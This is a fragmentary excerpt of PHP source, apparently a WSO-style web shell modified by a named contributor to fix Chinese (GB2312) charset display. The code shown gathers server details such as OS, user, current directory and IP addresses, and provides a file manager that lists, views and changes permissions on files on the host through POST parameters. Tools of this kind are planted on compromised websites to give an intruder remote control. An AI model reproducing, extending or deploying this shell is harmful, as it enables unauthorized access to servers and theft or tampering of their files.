...
//Modify: siwind
//QQ: 2307364086
// - fix for GB2312 charset in windows os.
//
//
...
$all_charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866','GB2312','GB18030','GBK');
...
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd'],ENT_QUOTES,'ISO-8859-1') . "'; //directory
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'   //file tool
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES,'ISO-8859-1')) ."';  //file name
...
<input type=hidden name=charset>
	...
	//$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866','GB2312','GB18030','GBK');
	global $all_charsets;  //move all charset to file header for convertion to add new language!
	...
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       ...
       . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . gethostbyname(@$_SERVER["SERVER_NAME"]) . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	...
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name'],ENT_QUOTES,'ISO-8859-1'):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' .htmlspecialchars($f['name'],ENT_QUOTES,'ISO-8859-1') . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?wsoViewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
...
function actionFilesTools() {
	...
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1']),ENT_QUOTES,'ISO-8859-1').' <span>Size:</span> '.(is_file($_POST['p1'])?wsoViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.wsoPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	...
	switch($_POST['p2']) {
		case 'view':
			...
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024),ENT_QUOTES,'ISO-8859-1');  //here readfile, but the content of chinese can not show correctely!
				@fclose($fp);
			}
			echo '</pre>';
			break;
